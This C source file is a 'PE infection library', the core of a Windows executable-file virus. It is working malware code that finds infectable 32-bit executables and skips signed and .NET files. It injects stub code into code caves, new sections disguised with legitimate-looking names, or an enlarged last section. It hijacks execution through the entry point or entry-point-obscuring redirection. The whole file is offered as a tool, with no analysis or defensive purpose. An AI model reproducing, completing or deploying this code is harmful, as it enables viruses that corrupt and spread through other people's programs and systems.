/* PE infection library
 * shebaw
 *
 * TO FIX:
 *	don't use is_set in get_new_sec, check for a better method
 * TO DO:
 *	add support for PE checksum recalculation
 */

#include <Windows.h>
#include <stdint.h>
#include "mem_map.h"
#include "pe_misc.h"
#include "random.h"
#include "infect.h"

static IMAGE_SECTION_HEADER *get_cave_sec(IMAGE_NT_HEADERS *nthdrs, size_t cave_size)
{
	WORD nsecs;
	IMAGE_SECTION_HEADER *sec_hdr;
	nsecs = nthdrs->FileHeader.NumberOfSections;
	sec_hdr = IMAGE_FIRST_SECTION(nthdrs);
	while (nsecs--) {
		DWORD vsize, rsize;
		vsize = sec_hdr->Misc.VirtualSize; rsize = sec_hdr->SizeOfRawData;
		if (rsize > vsize && rsize - vsize >= cave_size)
			return sec_hdr;
		++sec_hdr;
	}
	return NULL;
}

static int is_set(const BYTE *region, size_t region_size, BYTE val)
{
	size_t i;
	for (i = 0; i < region_size; ++i)
		if (region[i] != val)
			return 0;
	return 1;
}

static IMAGE_SECTION_HEADER *get_new_sec(const void *pe_map, IMAGE_NT_HEADERS *nthdrs)
{
	IMAGE_SECTION_HEADER *first_sec, *new_sec;
	void *first_sec_data;

	first_sec = IMAGE_FIRST_SECTION(GET_NTHDRS(pe_map));
	first_sec_data = (void *)((char *)pe_map + first_sec->PointerToRawData);
	new_sec = first_sec + nthdrs->FileHeader.NumberOfSections;
	return is_set((BYTE *)new_sec,
			(char *)first_sec_data - (char *)new_sec,
			0x00) ? new_sec : NULL;
}

static int has_appended_data(IMAGE_NT_HEADERS *nthdrs, size_t fsize)
{
	IMAGE_SECTION_HEADER *last_sec;
	last_sec = IMAGE_FIRST_SECTION(nthdrs) + nthdrs->FileHeader.NumberOfSections - 1;
	return last_sec->PointerToRawData + last_sec->SizeOfRawData == fsize ? 0 : 1;
}

static int has_cave_sec(IMAGE_NT_HEADERS *nthdrs, size_t cave_size)
{
	return get_cave_sec(nthdrs, cave_size) != NULL;
}

static int can_be_appended(IMAGE_NT_HEADERS *nthdrs, size_t pe_size)
{
	return !has_appended_data(nthdrs, pe_size);
}

static int can_have_new_sec(const void *pe_map, size_t pe_size,
		IMAGE_NT_HEADERS *nthdrs, size_t cave_size)
{
	return nthdrs->FileHeader.NumberOfSections < MAX_SECTIONS &&
		!has_appended_data(nthdrs, pe_size) &&
		get_new_sec(pe_map, nthdrs) != NULL;
}

static void mark_cave_insertion(IMAGE_NT_HEADERS *nthdrs, struct inf_stub *inf_stub_info)
{
	IMAGE_SECTION_HEADER *cave_sec;
	size_t stub_size;
	DWORD rva;

	stub_size = inf_stub_info->sdtls.has_const_size ?
		inf_stub_info->sdtls.stub_size : inf_stub_info->sdtls.size_cb();
	cave_sec = get_cave_sec(nthdrs, stub_size);
	rva = cave_sec->VirtualAddress + cave_sec->Misc.VirtualSize;
	cave_sec->Misc.VirtualSize += stub_size;
	cave_sec->Characteristics |= inf_stub_info->sdtls.sec_prot;

	inf_stub_info->inf_type = code_cave_t;
	inf_stub_info->rva = rva;
	inf_stub_info->added_size = 0;
}

static void generate_section_name(char *name)
{
	const char *names[] = {".text", ".rdata", ".data", ".rsrc", ".reloc"};
	strcpy(name, names[rand_int(0, _countof(names))]);
}

static void mark_new_sec_insertion(IMAGE_NT_HEADERS *nthdrs, struct inf_stub *inf_stub_info)
{
	IMAGE_SECTION_HEADER *last_sec, *new_sec;
	size_t stub_size;
	DWORD prev_img_end;

	stub_size = inf_stub_info->sdtls.has_const_size ?
		inf_stub_info->sdtls.stub_size : inf_stub_info->sdtls.size_cb();
	last_sec = IMAGE_FIRST_SECTION(nthdrs) + nthdrs->FileHeader.NumberOfSections - 1;
	prev_img_end = last_sec->PointerToRawData + last_sec->SizeOfRawData;
	new_sec = last_sec + 1;
	memset(&new_sec->Misc.VirtualSize, 0, sizeof(IMAGE_SECTION_HEADER) - IMAGE_SIZEOF_SHORT_NAME);
	new_sec->VirtualAddress = nthdrs->OptionalHeader.SizeOfImage;
	new_sec->Misc.VirtualSize = stub_size;
	new_sec->PointerToRawData = prev_img_end;
	new_sec->SizeOfRawData = ROUND(stub_size, nthdrs->OptionalHeader.FileAlignment);
	new_sec->Characteristics = inf_stub_info->sdtls.sec_prot;
	generate_section_name((char *)new_sec->Name);

	nthdrs->OptionalHeader.SizeOfImage = ROUND(new_sec->VirtualAddress + new_sec->Misc.VirtualSize,
			nthdrs->OptionalHeader.SectionAlignment);
	++nthdrs->FileHeader.NumberOfSections;

	inf_stub_info->inf_type = new_sec_t;
	inf_stub_info->rva = new_sec->VirtualAddress;
	inf_stub_info->added_size = new_sec->SizeOfRawData;
}

static void mark_last_sec_appendage(IMAGE_NT_HEADERS *nthdrs, struct inf_stub *inf_stub_info)
{
	IMAGE_SECTION_HEADER *last_sec;
	size_t stub_size;
	DWORD rva;
	DWORD orig_sec_rsize;

	stub_size = inf_stub_info->sdtls.has_const_size ?
		inf_stub_info->sdtls.stub_size : inf_stub_info->sdtls.size_cb();
	last_sec = IMAGE_FIRST_SECTION(nthdrs) + nthdrs->FileHeader.NumberOfSections - 1;
	rva = last_sec->VirtualAddress + last_sec->Misc.VirtualSize;
	last_sec->Misc.VirtualSize += stub_size;
	orig_sec_rsize = last_sec->SizeOfRawData;
	last_sec->SizeOfRawData = ROUND(last_sec->SizeOfRawData + stub_size, 
			nthdrs->OptionalHeader.FileAlignment);
	last_sec->Characteristics |= inf_stub_info->sdtls.sec_prot;
	nthdrs->OptionalHeader.SizeOfImage = ROUND(last_sec->VirtualAddress + last_sec->Misc.VirtualSize, 
		nthdrs->OptionalHeader.SectionAlignment);

	inf_stub_info->inf_type = append_t;
	inf_stub_info->rva = rva;
	inf_stub_info->added_size = last_sec->SizeOfRawData - orig_sec_rsize;
}

/*
static DWORD calc_PE_chksum(void *pe_map, size_t msize)
{
	__asm {
		mov	ecx, [msize]
		mov	edx, [pe_map]
		shr	ecx, 1
		xor	eax, eax
		clc
cloop:
			adc	ax, [edx + (ecx * 2) - 2]
			dec	ecx
			jnz	cloop
		adc	eax, [msize]
	}
}
*/

static int is_386_PE(void *map)
{
	IMAGE_DOS_HEADER *doshdr;
	IMAGE_NT_HEADERS *nthdrs;
	DWORD chars;

	doshdr = (IMAGE_DOS_HEADER *)map;
	nthdrs = (IMAGE_NT_HEADERS *)((char *)map + doshdr->e_lfanew);
	chars = nthdrs->FileHeader.Characteristics;
	return doshdr->e_magic == IMAGE_DOS_SIGNATURE &&
		nthdrs->Signature == IMAGE_NT_SIGNATURE &&
		nthdrs->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 &&
		(chars & IMAGE_FILE_EXECUTABLE_IMAGE || chars & IMAGE_FILE_DLL);
}

int get_infection_status(void *map, size_t size, infection_status_cb status_cb)
{
	IMAGE_NT_HEADERS *nthdrs;

	if (!is_386_PE(map))
		return INFLIB_ERR_ISNOT_X86_PE;
	nthdrs = GET_NTHDRS(map);
	if (nthdrs->FileHeader.NumberOfSections > MAX_SECTIONS)
		return INFLIB_ERR_TOO_MANY_SECTIONS;
	/* we don't want to infect files with TLS callbacks */
	if (dir_exists(nthdrs, IMAGE_DIRECTORY_ENTRY_TLS))
		return INFLIB_ERR_HAS_TLS;
	/* files with certificates shouldn't be infected */
	if (dir_exists(nthdrs, IMAGE_DIRECTORY_ENTRY_SECURITY))
		return INFLIB_ERR_HAS_CERT;
	/* .NET files shouldn't be infected */
	if (nthdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress != 0)
		return INFLIB_ERR_IS_MANAGED_CODE;
	return (status_cb && !status_cb(map, size)) ? INFLIB_ERR_DONT_INFECT : 0;
}

/* this is called first, and decides where to insert each stub in the target executable.
 * this *does not* modify the contents of the target executable
 */
int init_inf_info(const void *pe_map, size_t pe_fsize, struct inf_info *pe_inf_info,
		const enum inf_type_t inf_type_p[], const enum cntrl_redr_type_t redr_type_p[], size_t *add_size)
{
	struct inf_stub *inf_stubs;
	IMAGE_NT_HEADERS *snthdrs, *dnthdrs;
	uint32_t i;
	size_t cur_pe_fsize;
	IMAGE_SECTION_HEADER *last_sec;
	const enum cntrl_redr_type_t *cur_redr_type;
	int cr_found;

	/* make a working copy of the nthdrs that we can use */
	snthdrs = GET_NTHDRS(pe_map);
	dnthdrs = &pe_inf_info->pehdr.nthdrs;
	memcpy((void *)&pe_inf_info->pehdr, 
		(void *)snthdrs, 
		sizeof(IMAGE_NT_HEADERS) + snthdrs->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));

	/* decide which control redirection method to use */
	cr_found = 0;
	for (cur_redr_type = redr_type_p;
			*cur_redr_type != 0;
			++cur_redr_type) {
		union cr_redr_info redr_inf;
		
		switch (*cur_redr_type) {
		case ep_t:
			cr_found = TRUE;
			break;
		case epo_reloc_t:
			cr_found = find_reloc_imp_ref(pe_map, pe_fsize, 1, &redr_inf);
			break;
		case epo_imp_ref_t:
			cr_found = find_imp_cr_ref(pe_map, pe_fsize, 1, &redr_inf);
			break;
		case epo_subr_ref_t:
			cr_found = find_subr_cr_ref(pe_map, pe_fsize, 1, &redr_inf);
			break;
		case epo_most_ref_subr_t:
			cr_found = find_most_ref_subr(pe_map, pe_fsize, &redr_inf);
			break;
		}
		if (cr_found) {
			pe_inf_info->cr_type = *cur_redr_type;
			if (*cur_redr_type == ep_t)
				pe_inf_info->oep = dnthdrs->OptionalHeader.AddressOfEntryPoint;
			else
				pe_inf_info->redr_inf = redr_inf;
			break;
		}
	}
	/* didn't we manage to find a control redirection method? */
	if (!cr_found)
		return INFLIB_ERR_NO_CR_METHOD;

	/* keep track of the file size 
	 * (needed for checking if append_t and new_sec_t are possible) */
	cur_pe_fsize = pe_fsize;
	/* insert the normal stubs */
	inf_stubs = pe_inf_info->inf_stubs;
	for (i = 0; i < pe_inf_info->nstubs; ++i) {
		const enum inf_type_t *cur_type;
		size_t stub_size;

		/* overlay stubs are handled later */
		if (inf_stubs[i].sdtls.is_overlay_data)
			continue;

		inf_stubs[i].is_inserted = 0;
		stub_size = inf_stubs[i].sdtls.has_const_size ?
			inf_stubs[i].sdtls.stub_size : inf_stubs[i].sdtls.size_cb();

		/* continue to the next one if the stub doesn't want to be inserted */
		if (inf_stubs[i].sdtls.insert_cb &&
			!inf_stubs[i].sdtls.insert_cb(pe_map, &inf_stubs[i], pe_inf_info))
				continue;
		cur_type = inf_type_p;
		for (cur_type = inf_type_p; *cur_type != 0; ++cur_type) {
			if (*cur_type == code_cave_t && has_cave_sec(dnthdrs, stub_size)) {
				mark_cave_insertion(dnthdrs, &inf_stubs[i]);
				break;
			} else if (*cur_type == new_sec_t &&
				can_have_new_sec(pe_map, cur_pe_fsize, dnthdrs, stub_size)) {
				mark_new_sec_insertion(dnthdrs, &inf_stubs[i]);
				cur_pe_fsize += inf_stubs[i].added_size;
				break;
			} else if (*cur_type == append_t && can_be_appended(dnthdrs, cur_pe_fsize)) {
				mark_last_sec_appendage(dnthdrs, &inf_stubs[i]);
				cur_pe_fsize += inf_stubs[i].added_size;
				break;
			}
		}
		/* didn't manage to infect :( */
		if (*cur_type == 0)
			return INFLIB_ERR_NO_INF_METHOD;
		inf_stubs[i].is_inserted = TRUE;
	}

	/* insert the overlay stubs */
	last_sec = IMAGE_FIRST_SECTION(dnthdrs) + dnthdrs->FileHeader.NumberOfSections - 1;
	for (i = 0; i < pe_inf_info->nstubs; ++i) {
		size_t stub_size;

		if (!inf_stubs[i].sdtls.is_overlay_data)
			continue;
		stub_size = inf_stubs[i].sdtls.has_const_size ? 
			inf_stubs[i].sdtls.stub_size : inf_stubs[i].sdtls.size_cb();
		inf_stubs[i].added_size = stub_size;
		inf_stubs[i].offset = cur_pe_fsize;
		inf_stubs[i].is_inserted = TRUE;
		cur_pe_fsize += stub_size;
	}

	/* calculate the total additional size required */
	*add_size = cur_pe_fsize - pe_fsize;
	/* change the entry point if cr_type is ep_t */
	if (pe_inf_info->cr_type == ep_t)
		dnthdrs->OptionalHeader.AddressOfEntryPoint = inf_stubs[0].rva;
	return 0;
}

/* is called after init_inf_info to insert the stubs into the target executable */
int infect(void *pe_map, struct inf_info *pe_inf_info)
{
	DWORD nsections;
	uint32_t i;
	IMAGE_NT_HEADERS *snthdrs, *dnthdrs;
	struct inf_stub *inf_stubs;

	/* install the stubs by calling their installation callbacks */
	inf_stubs = pe_inf_info->inf_stubs;
	for (i = 0; i < pe_inf_info->nstubs; ++i)
		if (inf_stubs[i].is_inserted &&
			!inf_stubs[i].sdtls.inst_cb(pe_map, &inf_stubs[i], pe_inf_info))
			return INFLIB_ERR_INST_FAILURE;
	/* recalculate the new PE file checksum */
	snthdrs = &pe_inf_info->pehdr.nthdrs;
//	snthdrs->OptionalHeader.CheckSum = calc_PE_chksum(pe_map, );
	/* copy the new NT & section headers */
	dnthdrs = GET_NTHDRS(pe_map);
	nsections = snthdrs->FileHeader.NumberOfSections;
	memcpy(dnthdrs, &pe_inf_info->pehdr,
		sizeof(IMAGE_NT_HEADERS) + nsections * sizeof(IMAGE_SECTION_HEADER));
	return 0;
}